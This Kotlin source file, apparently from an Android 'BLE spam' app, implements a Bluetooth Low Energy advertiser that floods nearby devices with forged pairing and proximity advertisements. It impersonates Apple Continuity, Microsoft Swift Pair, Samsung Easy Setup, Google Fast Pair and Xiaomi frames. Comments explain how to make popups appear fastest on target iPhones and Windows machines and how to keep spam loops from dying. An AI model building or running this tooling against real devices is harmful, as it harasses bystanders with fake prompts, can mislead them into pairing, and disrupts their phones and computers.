package com.droid.flippy

import android.Manifest
import android.bluetooth.BluetoothDevice
import android.bluetooth.le.AdvertiseCallback
import android.bluetooth.le.AdvertiseData
import android.bluetooth.le.AdvertiseSettings
import android.bluetooth.le.AdvertisingSetCallback
import android.bluetooth.le.AdvertisingSetParameters
import android.os.Build
import android.util.Log
import androidx.annotation.RequiresPermission
import com.droid.flippy.plugin.PluginBluetoothHooks
import org.json.JSONObject

class BluetoothAdvertiser {

    private val bluetoothAdapter = BluetoothHelper.bluetoothAdapter
    private val advertiser get() = bluetoothAdapter?.bluetoothLeAdvertiser

    private val advertiseCallback = object : AdvertiseCallback() {
        override fun onStartSuccess(settingsInEffect: AdvertiseSettings) {
            Helper.log("Advertising started")
        }

        override fun onStartFailure(errorCode: Int) {
            Helper.log("Advertising failed: $errorCode")
        }
    }

    private var extCallback: AdvertisingSetCallback? = null
    private var legacyCallbackActive: Boolean = false
    private var extendedCallbackActive: Boolean = false

    /**
     * Reusable extended advertising set for tight spam loops.
     * Repeated start/stop cycles exhaust the controller's advertising slots
     * and make spam die silently while the UI still shows "active".
     */
    private var currentSet: android.bluetooth.le.AdvertisingSet? = null
    private var currentSetConnectable: Boolean = false
    private var setGeneration = 0

    @RequiresPermission(Manifest.permission.BLUETOOTH_ADVERTISE)
    fun advertise(
        advertiseData: AdvertiseData,
        scanResponse: AdvertiseData? = null,
        connectable: Boolean = false
    ) {
        val pluginDecision = PluginBluetoothHooks.interceptAdvertising(
            advertiseData,
            scanResponse,
            JSONObject().put("source", "ble_spam"),
        )
        if (pluginDecision.skipNative) return
        val effectiveData = pluginDecision.advertiseData
        val effectiveScanResponse = pluginDecision.scanResponse
        if (Helper.canUseExtendedAdvertising()) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                advertiseExtended(effectiveData, connectable)
                return
            }
        }
        advertiseLegacy(effectiveData, effectiveScanResponse, connectable)
    }

    /**
     * Apple Continuity fast path: forces LEGACY advertising even when the
     * chipset supports extended advertising.
     *
     * Why: iPhones scan Continuity (0x07 proximity-pairing / 0x0F nearby
     * action) on the primary legacy channels. Extended sets
     * (setLegacyMode(false), secondary PHY) are seen slowly or never —
     * this is why "Device" never popped and "Action Modal" took forever
     * on Samsung flagships that default to extended. Legacy
     * ADVERTISE_MODE_LOW_LATENCY (~100ms interval) + HIGH tx power pops
     * in 1-3s.
     *
     * Frame sizes: device frames are 27 bytes manufacturer payload
     * (07 19 + 25). With TxPower/DeviceName disabled the AdvertiseData
     * is exactly 31 bytes on air, so no scan response must be attached
     * (any scan response only slows iOS active-scan reassembly).
     * Always non-connectable: ADV_NONCONN_IND is scanned faster and
     * avoids iPhones attempting a GATT connect + backoff (one more
     * reason Device with connectable=true never showed).
     *
     * Legacy API holds a single instance per callback, so restart
     * (stop→start) is required to push the next payload each iteration.
     */
    @RequiresPermission(Manifest.permission.BLUETOOTH_ADVERTISE)
    fun advertiseApple(payload: ByteArray): Boolean {
        return advertiseLegacyRaw(
            manufacturerId = 0x004C,
            payload = payload,
            // Popup spam: ADV_NONCONN_IND is scanned faster and avoids the
            // target attempting a GATT connect + backoff.
            connectable = false
        )
    }

    /** Stops an [advertiseApple] session. */
    @RequiresPermission(Manifest.permission.BLUETOOTH_ADVERTISE)
    fun stopApple() {
        stopLegacyOnly()
    }

    /**
     * Swift Pair fast path: legacy-only, non-connectable, no scan response.
     *
     * Same extended-advertising trap as Apple (S26 defaults to extended
     * sets on the secondary PHY, which most Windows Bluetooth radios scan
     * slowly or never). Settings match the reference Android BLE-spam app
     * (LOW_LATENCY/HIGH, legacy, non-connectable): payload `03 00 80` /
     * `03 01 80...` + display name under Microsoft company ID 0x0006.
     */
    @RequiresPermission(Manifest.permission.BLUETOOTH_ADVERTISE)
    fun advertiseSwiftPair(payload: ByteArray): Boolean {
        return advertiseLegacyRaw(
            manufacturerId = SwiftPairPayloads.COMPANY_ID,
            payload = payload,
            connectable = false
        )
    }

    /** Stops an [advertiseSwiftPair] session. */
    @RequiresPermission(Manifest.permission.BLUETOOTH_ADVERTISE)
    fun stopSwiftPair() {
        stopLegacyOnly()
    }

    /**
     * Samsung Easy Setup fast path: legacy-only, non-connectable, WITH the
     * buds scan response. Reference settings (LOW_LATENCY/HIGH, legacy):
     * the scan response (13 zero bytes under Samsung ID 0x0075) is part of
     * the buds experience, and the old extended path silently dropped it
     * (`startAdvertisingSet` was called with a null scan response).
     */
    @RequiresPermission(Manifest.permission.BLUETOOTH_ADVERTISE)
    fun advertiseSamsung(payload: ByteArray, scanResponse: ByteArray?): Boolean {
        val scan = scanResponse?.let {
            AdvertiseData.Builder()
                .addManufacturerData(0x0075, it)
                .setIncludeTxPowerLevel(false)
                .setIncludeDeviceName(false)
                .build()
        }
        return startLegacy(
            AdvertiseData.Builder()
                .addManufacturerData(0x0075, payload)
                .setIncludeTxPowerLevel(false)
                .setIncludeDeviceName(false)
                .build(),
            scan,
            connectable = false
        )
    }

    /** Stops an [advertiseSamsung] session. */
    @RequiresPermission(Manifest.permission.BLUETOOTH_ADVERTISE)
    fun stopSamsung() {
        stopLegacyOnly()
    }

    /**
     * Google Fast Pair fast path: legacy-only, non-connectable, service
     * UUID 0xFE2C + 3-byte model service data + Tx Power in the packet
     * (Android uses Tx Power for the proximity estimate). Reference
     * settings: LOW_LATENCY/HIGH, legacy, non-connectable.
     */
    @RequiresPermission(Manifest.permission.BLUETOOTH_ADVERTISE)
    fun advertiseFastPair(serviceData: ByteArray): Boolean {
        val uuid = android.os.ParcelUuid.fromString("0000FE2C-0000-1000-8000-00805F9B34FB")
        return startLegacy(
            AdvertiseData.Builder()
                .addServiceUuid(uuid)
                .addServiceData(uuid, serviceData)
                .setIncludeTxPowerLevel(true)
                .setIncludeDeviceName(false)
                .build(),
            null,
            connectable = false
        )
    }

    /** Stops an [advertiseFastPair] session. */
    @RequiresPermission(Manifest.permission.BLUETOOTH_ADVERTISE)
    fun stopFastPair() {
        stopLegacyOnly()
    }

    /**
     * Xiaomi fast path: legacy-only, non-connectable. Same extended-trap
     * fix as the other platforms; payload format itself is unchanged.
     */
    @RequiresPermission(Manifest.permission.BLUETOOTH_ADVERTISE)
    fun advertiseXiaomi(payload: ByteArray): Boolean {
        return advertiseLegacyRaw(
            manufacturerId = 0x038F,
            payload = payload,
            connectable = false
        )
    }

    /** Stops an [advertiseXiaomi] session. */
    @RequiresPermission(Manifest.permission.BLUETOOTH_ADVERTISE)
    fun stopXiaomi() {
        stopLegacyOnly()
    }

    private fun advertiseLegacyRaw(manufacturerId: Int, payload: ByteArray, connectable: Boolean): Boolean {
        return startLegacy(
            AdvertiseData.Builder()
                .addManufacturerData(manufacturerId, payload)
                .setIncludeTxPowerLevel(false)
                .setIncludeDeviceName(false)
                .build(),
            null,
            connectable
        )
    }

    private fun startLegacy(
        advertiseData: AdvertiseData,
        scanResponse: AdvertiseData?,
        connectable: Boolean
    ): Boolean {
        val adv = advertiser ?: run {
            Helper.log("BluetoothLeAdvertiser is null (legacy)")
            return false
        }
        val settings = AdvertiseSettings.Builder()
            .setAdvertiseMode(AdvertiseSettings.ADVERTISE_MODE_LOW_LATENCY)
            .setTxPowerLevel(AdvertiseSettings.ADVERTISE_TX_POWER_HIGH)
            .setConnectable(connectable)
            .setTimeout(0)
            .build()
        return try {
            // Push the new payload: must stop the previous legacy instance first.
            try {
                adv.stopAdvertising(advertiseCallback)
            } catch (_: Exception) {
            }
            adv.startAdvertising(settings, advertiseData, scanResponse, advertiseCallback)
            legacyCallbackActive = true
            BleSpamRuntime.trackSentPackets()
            true
        } catch (e: Exception) {
            Helper.log("legacy advertise error: ${e.message}")
            legacyCallbackActive = false
            false
        }
    }

    @RequiresPermission(Manifest.permission.BLUETOOTH_ADVERTISE)
    private fun advertiseLegacy(
        advertiseData: AdvertiseData,
        scanResponse: AdvertiseData?,
        connectable: Boolean = false
    ) {
        val adv = advertiser ?: run {
            Helper.log("BluetoothLeAdvertiser is null")
            return
        }
        val settings = AdvertiseSettings.Builder()
            .setAdvertiseMode(AdvertiseSettings.ADVERTISE_MODE_LOW_LATENCY)
            .setTxPowerLevel(AdvertiseSettings.ADVERTISE_TX_POWER_HIGH)
            .setConnectable(connectable)
            .setTimeout(0)
            .build()
        try {
            adv.startAdvertising(settings, advertiseData, scanResponse, advertiseCallback)
            legacyCallbackActive = true
            BleSpamRuntime.trackSentPackets()
        } catch (e: Exception) {
            Helper.log("startAdvertising error: ${e.message}")
            legacyCallbackActive = false
        }
    }

    @androidx.annotation.RequiresApi(Build.VERSION_CODES.O)
    @RequiresPermission(Manifest.permission.BLUETOOTH_ADVERTISE)
    private fun advertiseExtended(advertiseData: AdvertiseData, connectable: Boolean = false) {
        startExtendedSet(advertiseData, connectable)
    }

    /**
     * Spam-loop entry point: reuses one extended advertising set and only
     * replaces its payload per iteration. Falls back to legacy advertising
     * on hardware without extended support. Returns false when there is no
     * advertiser at all.
     */
    @RequiresPermission(Manifest.permission.BLUETOOTH_ADVERTISE)
    fun advertisePersistent(
        advertiseData: AdvertiseData,
        scanResponse: AdvertiseData? = null,
        connectable: Boolean = false
    ): Boolean {
        val pluginDecision = PluginBluetoothHooks.interceptAdvertising(
            advertiseData,
            scanResponse,
            JSONObject().put("source", "ble_spam_persistent"),
        )
        if (pluginDecision.skipNative) return true
        val effectiveData = pluginDecision.advertiseData
        val effectiveScanResponse = pluginDecision.scanResponse
        if (!Helper.canUseExtendedAdvertising()) {
            advertiseLegacy(effectiveData, effectiveScanResponse, connectable)
            return legacyCallbackActive
        }
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) {
            advertiseLegacy(effectiveData, effectiveScanResponse, connectable)
            return legacyCallbackActive
        }
        val set = currentSet
        if (extendedCallbackActive && set != null && currentSetConnectable == connectable) {
            try {
                set.setAdvertisingData(effectiveData)
                BleSpamRuntime.trackSentPackets()
                return true
            } catch (e: Exception) {
                Helper.log("setAdvertisingData failed, restarting set: ${e.message}")
            }
        }
        return startExtendedSet(effectiveData, connectable)
    }

    /** Stops a [advertisePersistent] session. */
    @RequiresPermission(Manifest.permission.BLUETOOTH_ADVERTISE)
    fun stopPersistent() {
        stopSetOnly()
        stopLegacyOnly()
    }

    @androidx.annotation.RequiresApi(Build.VERSION_CODES.O)
    @RequiresPermission(Manifest.permission.BLUETOOTH_ADVERTISE)
    private fun startExtendedSet(advertiseData: AdvertiseData, connectable: Boolean): Boolean {
        val adv = advertiser ?: run {
            Helper.log("BluetoothLeAdvertiser is null (extended)")
            return false
        }

        val params = AdvertisingSetParameters.Builder()
            .setLegacyMode(false)
            .setInterval(AdvertisingSetParameters.INTERVAL_MIN)
            .setTxPowerLevel(AdvertisingSetParameters.TX_POWER_HIGH)
            .setConnectable(connectable)
            .setScannable(false)
            .setPrimaryPhy(BluetoothDevice.PHY_LE_1M)
            .setSecondaryPhy(BluetoothDevice.PHY_LE_1M)
            .build()

        val generation = ++setGeneration
        val callback = object : AdvertisingSetCallback() {
            override fun onAdvertisingSetStarted(
                advertisingSet: android.bluetooth.le.AdvertisingSet?,
                txPower: Int,
                status: Int
            ) {
                if (generation != setGeneration) {
                    // Superseded by a newer start; release immediately.
                    if (status == ADVERTISE_SUCCESS && advertisingSet != null) {
                        runCatching { adv.stopAdvertisingSet(this) }
                    }
                    return
                }
                if (status == ADVERTISE_SUCCESS) {
                    currentSet = advertisingSet
                    currentSetConnectable = connectable
                    extendedCallbackActive = true
                    Helper.log("Extended advertising started (tx=$txPower dBm)")
                } else {
                    Helper.log("Extended advertising failed: $status")
                    if (status == 2) {
                        Helper.log("Data too large for extended advertising - falling back to legacy")
                        Helper.hardwareExtendedBroken = true
                    }
                    extendedCallbackActive = false
                    currentSet = null
                    advertiseLegacy(advertiseData, null, connectable)
                }
            }

            override fun onAdvertisingSetStopped(advertisingSet: android.bluetooth.le.AdvertisingSet?) {
                if (generation == setGeneration) {
                    currentSet = null
                    extendedCallbackActive = false
                }
            }
        }
        extCallback = callback

        try {
            adv.startAdvertisingSet(params, advertiseData, null, null, null, callback)
            extendedCallbackActive = true
            BleSpamRuntime.trackSentPackets()
            return true
        } catch (e: Exception) {
            Helper.log("startAdvertisingSet error: ${e.message}")
            extendedCallbackActive = false
            currentSet = null
            advertiseLegacy(advertiseData, null, connectable)
            return legacyCallbackActive
        }
    }

    private fun stopSetOnly() {
        // Invalidate any in-flight start callbacks first.
        setGeneration++
        extendedCallbackActive = false
        currentSet = null
        extCallback?.let { callback ->
            extCallback = null
            try {
                advertiser?.stopAdvertisingSet(callback)
                Helper.log("Extended advertising stopped")
            } catch (e: Exception) {
                Log.e("BLESpam", "Error stopping extended advertising: ${e.message}")
            }
        }
    }

    private fun stopLegacyOnly() {
        if (legacyCallbackActive) {
            try {
                advertiser?.stopAdvertising(advertiseCallback)
                Helper.log("Legacy advertising stopped")
            } catch (e: Exception) {
                Log.e("BLESpam", "Error stopping legacy advertising: ${e.message}")
            }
            legacyCallbackActive = false
        }
    }

    @RequiresPermission(Manifest.permission.BLUETOOTH_ADVERTISE)
    fun stopAdvertising() {
        val pluginDecision = PluginBluetoothHooks.action("bluetooth.advertising.stop", JSONObject().put("source", "ble_spam"))
        if (pluginDecision.cancelled) return
        if (pluginDecision.handled) {
            extendedCallbackActive = false
            extCallback = null
            legacyCallbackActive = false
            return
        }
        stopSetOnly()
        stopLegacyOnly()
    }
}

